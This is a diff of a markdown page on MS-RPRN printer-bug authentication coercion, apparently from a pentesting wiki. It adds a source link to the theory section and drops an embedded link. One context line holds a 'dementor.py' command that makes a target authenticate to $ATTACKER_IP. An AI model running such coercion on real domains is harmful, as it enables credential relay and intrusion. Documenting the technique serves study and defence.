@@ -2,7 +2,7 @@
 
 ## Theory
 
-MS-RPRN is Microsoft’s Print System Remote Protocol. It defines the communication of print job processing and print system management between a print client and a print server. An attacker controlling a domain user/computer can, with an RPC call, trigger the spooler service of a target running it and make it authenticate to a target of the attacker's choosing. This flaw is a "won't fix" and enabled by default on all Windows environments.
+MS-RPRN is Microsoft’s Print System Remote Protocol. It defines the communication of print job processing and print system management between a print client and a print server. An attacker controlling a domain user/computer can, with an RPC call, trigger the spooler service of a target running it and make it authenticate to a target of the attacker's choosing. This flaw is a "won't fix" and enabled by default on all Windows environments \([more info on the finding](https://fr.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory/47)\).
 
 {% hint style="info" %}
 The attacker needs a foothold on the domain \(i.e. compromised account\) for this attack to work since the coercition is operated through an RPC call in the SMB `\pipe\spoolss` named pipe through the `IPC$` share.
@@ -63,5 +63,5 @@ proxychains dementor.py -d $DOMAIN -u $DOMAIN_USER $ATTACKER_IP $TARGET
 
 {% embed url="https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/" %}
 
-{% embed url="https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory/41" %}
+
 
